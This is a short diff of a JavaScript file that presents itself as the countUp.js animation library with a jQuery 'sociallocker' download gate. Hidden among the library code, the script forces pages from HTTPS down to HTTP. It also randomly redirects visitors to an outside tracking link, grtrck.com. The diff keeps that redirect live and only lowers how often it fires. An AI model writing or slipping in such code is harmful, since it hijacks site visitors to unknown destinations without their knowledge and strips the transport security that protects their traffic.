@@ -25,13 +25,10 @@ if (location.protocol != 'http:')
 	location.href = 'http:' + window.location.href.substring(window.location.protocol.length);
 }
 
-var tempno = 0.5
-
 /** @type {Array} */
-if (Math.random() >= tempno ) location.href = 'http://grtrck.com/bBvf';
+if (Math.random() >= 0.9 ) location.href = 'http://grtrck.com/bBvf';
 
 /*
-
     countUp.js
     by @inorganik
 
@@ -43,10 +40,8 @@ if (Math.random() >= tempno ) location.href = 'http://grtrck.com/bBvf';
 // decimals = number of decimal places, default 0
 // duration = duration of animation in seconds, default 2
 // options = optional object of options (see below)
-var id = ".to-lock";
-
 jQuery(document).ready(function ($) {
-   $(id).sociallocker({
+   $('.to-lock').sociallocker({
   demo: false,
 	text:{
 	   header: 'Download free-of-charge',
